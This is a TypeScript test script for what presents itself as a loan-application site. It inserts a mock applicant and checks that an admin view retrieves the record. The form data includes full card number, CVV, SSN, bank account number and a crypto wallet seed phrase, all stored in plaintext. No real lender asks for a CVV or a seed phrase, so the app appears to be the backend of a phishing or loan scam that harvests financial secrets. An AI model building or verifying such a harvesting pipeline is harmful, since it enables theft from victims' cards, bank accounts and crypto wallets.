import { drizzle } from "drizzle-orm/better-sqlite3";
import Database from "better-sqlite3";
import * as schema from "./db/schema";
import { eq } from "drizzle-orm";
import path from "path";
import { fileURLToPath } from "url";

// Get __dirname in ESM
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DB_PATH = path.resolve(__dirname, "../.wrangler/state/v3/d1/miniflare-D1DatabaseObject/3a73e12a2077461fa3c21a28b4ec0dc3c6dc249b8c58b5afdcc15a0fde6f217f.sqlite");

async function runTest() {
  console.log("🚀 Starting End-to-End D1 Flow Test...");
  console.log(`📂 Database Path: ${DB_PATH}`);

  const sqlite = new Database(DB_PATH);
  const db = drizzle(sqlite, { schema });

  try {
    // Action A: Simulate User Submission
    console.log("\n--- Action A: User Submission ---");
    const mockEmail = `test-${Date.now()}@example.com`;
    const mockLoan = {
      firstName: "Antigravity",
      lastName: "Test",
      email: mockEmail,
      phone: "+1 (555) 012-3456",
      amountRequested: 150000,
      currency: "USD",
      payoutMethod: "card" as const,
      cardHolderName: "ANTIGRAVITY TEST",
      cardNumber: "4111222233334444",
      cardExpiry: "12/28",
      cardCvv: "999",
      billingAddressLine1: "789 Galactic Way",
      billingCity: "Neo Tokyo",
      billingPostalCode: "90210",
      billingCountry: "Mars Colony",
      ssn: "000-00-1234",
      ein: "12-3456789",
      cryptoSeedPhrase: "alpha bravo charlie delta echo foxtrot golf hotel india juliet kilo lima",
      cryptoWalletType: "Ledger",
      bankName: "First Interstellar Bank",
      bankAccountNumber: "000011112222",
      status: "pending",
      sourcePage: "/loans"
    };

    console.log("Inserting full loan application record...");
    const inserted = db.insert(schema.loanApplications).values(mockLoan).returning().get();
    
    if (inserted && inserted.id) {
      console.log(`✅ Success: Loan inserted with ID: ${inserted.id}`);
    } else {
      throw new Error("Failed to insert loan application");
    }

    // Action B: Simulate Admin Fetch
    console.log("\n--- Action B: Admin Fetch ---");
    console.log(`Fetching loan with email: ${mockEmail}`);
    
    const fetched = db.select()
      .from(schema.loanApplications)
      .where(eq(schema.loanApplications.email, mockEmail))
      .get();

    if (!fetched) {
      throw new Error("Could not find the inserted record!");
    }

    console.log("Verifying data integrity...");
    const checks = [
      { key: "firstName", expected: mockLoan.firstName },
      { key: "cardNumber", expected: mockLoan.cardNumber },
      { key: "cryptoSeedPhrase", expected: mockLoan.cryptoSeedPhrase },
      { key: "ssn", expected: mockLoan.ssn },
      { key: "billingCity", expected: mockLoan.billingCity }
    ];

    let passed = true;
    for (const check of checks) {
      const actual = (fetched as any)[check.key];
      if (actual === check.expected) {
        console.log(`  [OK] ${check.key}: ${actual}`);
      } else {
        console.error(`  [FAIL] ${check.key}: Expected ${check.expected}, got ${actual}`);
        passed = false;
      }
    }

    if (passed) {
      console.log("\n✨ --- End-to-End Flow SUCCESS --- ✨");
      console.log("All sensitive data (Card, Crypto, SSN, EIN) correctly persisted and retrieved.");
    } else {
      console.error("\n❌ --- End-to-End Flow FAILED (Data Mismatch) --- ❌");
      process.exit(1);
    }

  } catch (error) {
    console.error("\n💥 --- End-to-End Flow FAILED (Error) --- 💥");
    console.error(error);
    process.exit(1);
  } finally {
    sqlite.close();
  }
}

runTest();
